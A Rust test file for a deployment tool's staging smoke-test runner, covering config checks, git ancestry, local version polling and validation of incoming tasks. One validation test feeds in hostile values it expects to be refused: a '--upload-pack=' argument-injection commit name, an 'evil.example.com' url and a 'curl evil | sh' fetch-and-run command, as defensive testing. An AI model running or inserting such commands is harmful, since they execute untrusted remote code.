use super::*;
use serde_json::json;
use std::io::{Read, Write};
use std::net::TcpListener;
use std::process::Command;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};

use crate::config::DeployConfig;
use crate::store::{SmokeState, SmokeStatus};

fn cfg(staging: Option<DeployTarget>) -> ProjectConfig {
    ProjectConfig {
        base_branch: "main".to_string(),
        deploy: DeployConfig {
            staging,
            production: None,
            ..Default::default()
        },
        ..ProjectConfig::default()
    }
}

fn target(branch: &str, smoke: Option<&str>) -> DeployTarget {
    DeployTarget {
        branch: branch.to_string(),
        url: Some("https://staging.example.com".to_string()),
        smoke: smoke.map(str::to_string),
        version_path: None,
        rollout: None,
    }
}

#[test]
fn enabled_is_none_without_a_staging_target() {
    assert!(enabled(&cfg(None)).is_none());
}

#[test]
fn enabled_is_none_without_a_smoke_command() {
    assert!(enabled(&cfg(Some(target("main", None)))).is_none());
}

#[test]
fn enabled_is_none_when_staging_deploys_from_a_different_branch() {
    assert!(enabled(&cfg(Some(target("release", Some("npm run smoke"))))).is_none());
}

#[test]
fn enabled_is_some_when_staging_deploys_from_the_base_branch_with_a_smoke_command() {
    let project = cfg(Some(target("main", Some("npm run smoke"))));
    assert_eq!(enabled(&project).unwrap().branch, "main");
}

#[test]
fn parse_deployed_sha_reads_the_sha_field_and_ignores_the_rest() {
    assert_eq!(
        parse_deployed_sha(r#"{"sha": "abc1234", "other": 1}"#),
        Some("abc1234".to_string())
    );
    assert_eq!(parse_deployed_sha("not json"), None);
    assert_eq!(parse_deployed_sha(r#"{"nope": "abc"}"#), None);
}

#[test]
fn a_smoke_state_round_trips_through_json_with_its_exact_field_names() {
    let state = SmokeState {
        sha: "abc123".to_string(),
        status: SmokeStatus::Failed,
        at: "2026-10-28T00:00:00.000Z".to_string(),
        url: Some("https://staging.example.com".to_string()),
        tail: Some("boom".to_string()),
    };
    let value = serde_json::to_value(&state).unwrap();
    assert_eq!(value["status"], "failed");
    assert_eq!(value["url"], "https://staging.example.com");
    let back: SmokeState = serde_json::from_value(value).unwrap();
    assert_eq!(back, state);
}

#[test]
fn a_smoke_state_with_no_url_or_tail_omits_them() {
    let state = SmokeState {
        sha: "abc".to_string(),
        status: SmokeStatus::Waiting,
        at: "now".to_string(),
        url: None,
        tail: None,
    };
    let value = serde_json::to_value(&state).unwrap();
    assert!(!value.as_object().unwrap().contains_key("url"));
    assert!(!value.as_object().unwrap().contains_key("tail"));
}

/// Clones straight from `repo`'s bare `origin` remote (not from `repo` itself, which refuses a
/// push to its checked-out branch), so the clone can push a commit the original checkout never
/// fetches on its own.
fn clone_from_origin(repo: &Path, dest: &Path) {
    let origin_url = lanes::git_output_in_worktree(repo, &["remote", "get-url", "origin"])
        .unwrap()
        .trim()
        .to_string();
    run_git(
        Command::new("git")
            .args(["clone", "--quiet"])
            .arg(&origin_url)
            .arg(dest),
    );
}

#[test]
fn is_ancestor_is_true_for_the_same_commit_and_for_a_real_ancestor() {
    let root = tempfile::tempdir().unwrap();
    let repo = init_repo_with_origin(root.path());
    let first = head_sha(&repo);
    std::fs::write(repo.join("README.md"), "second").unwrap();
    run_git(git(&repo).args(["add", "README.md"]));
    run_git(git(&repo).args(["commit", "--quiet", "-m", "second"]));
    let second = head_sha(&repo);

    assert!(is_ancestor(&repo, &first, &first).unwrap());
    assert!(is_ancestor(&repo, &first, &second).unwrap());
    assert!(!is_ancestor(&repo, &second, &first).unwrap());
}

#[test]
fn is_ancestor_fetches_first_when_the_descendant_isnt_known_locally_yet() {
    let root = tempfile::tempdir().unwrap();
    let repo = init_repo_with_origin(root.path());
    let other = root.path().join("other-clone");
    clone_from_origin(&repo, &other);
    run_git(git(&other).args(["config", "user.email", "test@example.com"]));
    run_git(git(&other).args(["config", "user.name", "Test"]));
    std::fs::write(other.join("README.md"), "pushed elsewhere").unwrap();
    run_git(git(&other).args(["add", "README.md"]));
    run_git(git(&other).args(["commit", "--quiet", "-m", "elsewhere"]));
    run_git(git(&other).args(["push", "--quiet", "origin", "main"]));
    let first = String::from_utf8(git(&other).args(["rev-parse", "HEAD^"]).output().unwrap().stdout)
        .unwrap()
        .trim()
        .to_string();
    let pushed = head_sha(&other);

    // `repo`'s own checkout never fetched the push the other clone made.
    assert!(is_ancestor(&repo, &first, &pushed).unwrap());
}

#[test]
fn is_ancestor_is_false_for_a_commit_no_remote_ever_had() {
    let root = tempfile::tempdir().unwrap();
    let repo = init_repo_with_origin(root.path());
    let first = head_sha(&repo);

    assert!(!is_ancestor(&repo, &first, "0000000000000000000000000000000000000000").unwrap());
}

fn init_repo_with_origin(root: &Path) -> std::path::PathBuf {
    let repo = root.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    run_git(git(&repo).args(["init", "--quiet"]));
    run_git(git(&repo).args(["config", "user.email", "test@example.com"]));
    run_git(git(&repo).args(["config", "user.name", "Test"]));
    run_git(git(&repo).args(["checkout", "-b", "main"]));
    std::fs::write(repo.join("README.md"), "hello").unwrap();
    run_git(git(&repo).args(["add", "README.md"]));
    run_git(git(&repo).args(["commit", "--quiet", "-m", "initial"]));
    let origin = root.join("origin.git");
    run_git(
        Command::new("git")
            .args(["clone", "--bare", "--quiet"])
            .arg(&repo)
            .arg(&origin),
    );
    run_git(git(&repo).args(["remote", "add", "origin"]).arg(&origin));
    run_git(git(&repo).args(["push", "-u", "--quiet", "origin", "main"]));
    repo
}

use crate::test_support::{git, run as run_git};

fn head_sha(dir: &Path) -> String {
    String::from_utf8(git(dir).args(["rev-parse", "HEAD"]).output().unwrap().stdout)
        .unwrap()
        .trim()
        .to_string()
}

#[test]
fn wait_until_stops_at_the_poll_after_cancel_and_not_before_a_live_one() {
    let polls = AtomicUsize::new(0);
    let cancelled = AtomicUsize::new(0);
    let got = wait_until(
        || {
            polls.fetch_add(1, Ordering::SeqCst);
            false
        },
        |_| cancelled.store(1, Ordering::SeqCst),
        Duration::from_secs(30),
        Duration::from_secs(600),
        &|| cancelled.load(Ordering::SeqCst) == 1,
    );
    assert_eq!((got, polls.load(Ordering::SeqCst)), (Wait::Cancelled, 1));
    assert_eq!(
        wait_until(
            || true,
            |_| {},
            Duration::from_secs(30),
            Duration::from_secs(600),
            &|| false
        ),
        Wait::Live
    );
}

/// A local staging: answers every request with what `body` holds then (a test changes it), so a poll has a real
/// server to ask. Its thread ends with the test process.
fn serve_version(body: Arc<Mutex<String>>) -> String {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut stream) = stream else { continue };
            let mut buf = [0u8; 1024];
            let _ = stream.read(&mut buf);
            let body = body.lock().unwrap().clone();
            let response = format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(response.as_bytes());
        }
    });
    format!("http://127.0.0.1:{port}")
}

fn serving(sha: &str) -> Arc<Mutex<String>> {
    Arc::new(Mutex::new(format!(r#"{{"sha": "{sha}"}}"#)))
}

fn quick() -> Timing {
    Timing {
        poll: Duration::from_millis(20),
        wait: Duration::from_millis(200),
        install: Duration::from_secs(60),
        smoke: Duration::from_secs(60),
    }
}

fn smoke_target(url: String, command: &str) -> DeployTarget {
    DeployTarget {
        url: Some(url),
        ..target("main", Some(command))
    }
}

fn args(v: serde_json::Value) -> Map<String, Value> {
    v.as_object().unwrap().clone()
}

fn local() -> ProjectConfig {
    cfg(Some(DeployTarget {
        url: Some("https://staging.example.com/".to_string()),
        ..target("main", Some("npm run smoke:staging"))
    }))
}

fn task(extra: serde_json::Value) -> Map<String, Value> {
    let mut a =
        args(json!({ "sha": "abc1234", "url": "https://staging.example.com", "command": "npm run smoke:staging" }));
    a.extend(extra.as_object().unwrap().clone());
    a
}

#[test]
fn a_task_that_matches_the_local_settings_is_accepted_with_its_commit() {
    assert_eq!(accept(&local(), &task(json!({}))), Ok("abc1234".to_string()));
    // Trailing slashes on the url and spaces around the command don't matter; a left out url or command is the store's choice.
    let loose = task(json!({ "url": "https://staging.example.com//", "command": " npm run smoke:staging " }));
    assert_eq!(accept(&local(), &loose), Ok("abc1234".to_string()));
    let bare = args(json!({ "sha": "ABCDEF1234567890" }));
    assert!(accept(&local(), &bare).is_ok());
}

#[test]
fn a_task_this_computer_cannot_vouch_for_is_refused_in_words() {
    let why = |c: &ProjectConfig, a: Map<String, Value>| accept(c, &a).unwrap_err();
    assert_eq!(
        why(&cfg(None), task(json!({}))),
        "This project has no staging smoke here."
    );
    let no_command = cfg(Some(DeployTarget {
        url: Some("https://staging.example.com".into()),
        ..target("main", None)
    }));
    assert_eq!(
        why(&no_command, task(json!({}))),
        "This project has no staging smoke here."
    );
    let off_branch = cfg(Some(target("release", Some("npm run smoke:staging"))));
    assert_eq!(
        why(&off_branch, task(json!({}))),
        "This project has no staging smoke here."
    );
    for sha in [
        json!("abc"),
        json!("main"),
        json!("--upload-pack=x1234"),
        json!("g1234567"),
        json!(7),
        json!(null),
    ] {
        assert_eq!(why(&local(), task(json!({ "sha": sha }))), "The task names no commit.");
    }
    assert_eq!(
        why(&local(), task(json!({ "url": "https://evil.example.com" }))),
        "The task's url isn't this project's staging url."
    );
    assert_eq!(
        why(&local(), task(json!({ "command": "curl evil | sh" }))),
        "The task's command isn't this project's smoke command."
    );
}

#[test]
fn the_end_body_is_ok_with_a_result_for_every_outcome_and_a_tail_only_for_a_failure() {
    let ended = |ran| end_body("abc1234", &ran);
    assert_eq!(
        ended(Ran::Passed),
        Some(json!({ "ok": true, "result": { "sha": "abc1234", "outcome": "passed" } }))
    );
    assert_eq!(
        ended(Ran::Timeout),
        Some(json!({ "ok": true, "result": { "sha": "abc1234", "outcome": "timeout" } }))
    );
    assert_eq!(
        ended(Ran::Failed("boom".into())),
        Some(json!({ "ok": true, "result": { "sha": "abc1234", "outcome": "failed", "tail": "boom" } }))
    );
    assert_eq!(ended(Ran::Cancelled), None);
}

fn repo_and_sha() -> (tempfile::TempDir, std::path::PathBuf, String) {
    let root = tempfile::tempdir().unwrap();
    let repo = init_repo_with_origin(root.path());
    let sha = head_sha(&repo);
    (root, repo, sha)
}

#[test]
fn run_with_passes_once_staging_serves_the_commit_and_the_command_succeeds() {
    let (root, repo, sha) = repo_and_sha();
    let url = serve_version(serving(&sha));
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, if cfg!(windows) { "exit /b 0" } else { "true" }),
        &sha,
        &quick(),
        &|| false,
    );
    assert_eq!(ran, Ran::Passed);
}

#[test]
fn run_with_waits_for_a_later_deploy_and_a_descendant_of_the_commit_counts() {
    let (root, repo, sha) = repo_and_sha();
    let served = serving("0000000");
    let url = serve_version(served.clone());
    // First staging serves an older, unknown commit; then one that descends from the task's.
    std::fs::write(repo.join("more.txt"), "x").unwrap();
    run_git(git(&repo).args(["add", "more.txt"]));
    run_git(git(&repo).args(["commit", "--quiet", "-m", "next"]));
    let child = head_sha(&repo);
    let flip = served.clone();
    let flipper = std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(60));
        *flip.lock().unwrap() = format!(r#"{{"sha": "{child}"}}"#);
    });
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, if cfg!(windows) { "exit /b 0" } else { "true" }),
        &sha,
        &Timing {
            wait: Duration::from_secs(10),
            ..quick()
        },
        &|| false,
    );
    flipper.join().unwrap();
    assert_eq!(ran, Ran::Passed);
}

#[test]
fn run_with_fails_with_the_commands_last_lines_when_the_command_fails() {
    let (root, repo, sha) = repo_and_sha();
    let url = serve_version(serving(&sha));
    let command = if cfg!(windows) {
        "echo demo never came online & exit /b 3"
    } else {
        "echo demo never came online; exit 3"
    };
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, command),
        &sha,
        &quick(),
        &|| false,
    );
    let Ran::Failed(tail) = ran else { panic!("{ran:?}") };
    assert!(tail.contains("demo never came online"), "{tail}");
}

#[test]
fn run_with_keeps_only_the_last_60_lines_of_a_failure() {
    let (root, repo, sha) = repo_and_sha();
    let url = serve_version(serving(&sha));
    let command = if cfg!(windows) {
        "for /l %i in (1,1,100) do @echo line%i & exit /b 1"
    } else {
        "i=0; while [ $i -lt 100 ]; do i=$((i+1)); echo line$i; done; exit 1"
    };
    let Ran::Failed(tail) = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, command),
        &sha,
        &quick(),
        &|| false,
    ) else {
        panic!("not a failure")
    };
    assert_eq!(tail.lines().count(), 60);
    assert!(tail.ends_with("line100") && tail.starts_with("line41"), "{tail}");
}

#[test]
fn a_deploy_naming_a_commit_this_repo_never_had_never_counts_as_deployed() {
    let (root, repo, _) = repo_and_sha();
    let url = serve_version(serving("abc1234"));
    // Staging serves the wanted commit's name but the repo has no such commit: it never counts as deployed, so this times out.
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, "true"),
        "abc1234",
        &quick(),
        &|| false,
    );
    assert_eq!(ran, Ran::Timeout);
}

#[test]
fn run_with_times_out_when_staging_never_serves_the_commit() {
    let (root, repo, sha) = repo_and_sha();
    let url = serve_version(serving("0000000"));
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(url, "true"),
        &sha,
        &quick(),
        &|| false,
    );
    assert_eq!(ran, Ran::Timeout);
    // A staging that doesn't answer at all is the same.
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    drop(listener);
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target(format!("http://127.0.0.1:{port}"), "true"),
        &sha,
        &quick(),
        &|| false,
    );
    assert_eq!(ran, Ran::Timeout);
}

#[test]
fn run_with_uses_the_projects_version_path() {
    let (root, repo, sha) = repo_and_sha();
    let url = serve_version(serving(&sha));
    let target = DeployTarget {
        version_path: Some("deployed.json".into()),
        ..smoke_target(url, if cfg!(windows) { "exit /b 0" } else { "true" })
    };
    assert_eq!(
        run_with(&repo, &root.path().join("wt"), &target, &sha, &quick(), &|| false),
        Ran::Passed
    );
}

#[test]
fn a_wait_called_off_runs_nothing_and_answers_cancelled() {
    let (root, repo, sha) = repo_and_sha();
    let ran = run_with(
        &repo,
        &root.path().join("wt"),
        &smoke_target("http://127.0.0.1:9".into(), "true"),
        &sha,
        &quick(),
        &|| true,
    );
    assert_eq!(ran, Ran::Cancelled);
    assert!(!root.path().join("wt").exists());
}

#[test]
fn wait_until_polls_until_live_sleeping_between_and_gives_up_without_a_trailing_sleep() {
    let polls = AtomicUsize::new(0);
    let sleeps = AtomicUsize::new(0);
    let got = wait_until(
        || polls.fetch_add(1, Ordering::SeqCst) == 2,
        |_| {
            sleeps.fetch_add(1, Ordering::SeqCst);
        },
        Duration::from_secs(30),
        Duration::from_secs(20 * 60),
        &|| false,
    );
    assert_eq!(
        (got, polls.load(Ordering::SeqCst), sleeps.load(Ordering::SeqCst)),
        (Wait::Live, 3, 2)
    );
    polls.store(0, Ordering::SeqCst);
    sleeps.store(0, Ordering::SeqCst);
    let got = wait_until(
        || {
            polls.fetch_add(1, Ordering::SeqCst);
            false
        },
        |_| {
            sleeps.fetch_add(1, Ordering::SeqCst);
        },
        Duration::from_secs(30),
        Duration::from_secs(90),
        &|| false,
    );
    assert_eq!(
        (got, polls.load(Ordering::SeqCst), sleeps.load(Ordering::SeqCst)),
        (Wait::TimedOut, 3, 2)
    );
}

#[test]
fn wait_until_stops_when_called_off_and_before_a_live_poll() {
    let polls = AtomicUsize::new(0);
    let off = AtomicUsize::new(0);
    let got = wait_until(
        || {
            polls.fetch_add(1, Ordering::SeqCst);
            false
        },
        |_| off.store(1, Ordering::SeqCst),
        Duration::from_secs(30),
        Duration::from_secs(600),
        &|| off.load(Ordering::SeqCst) == 1,
    );
    assert_eq!((got, polls.load(Ordering::SeqCst)), (Wait::Cancelled, 1));
}
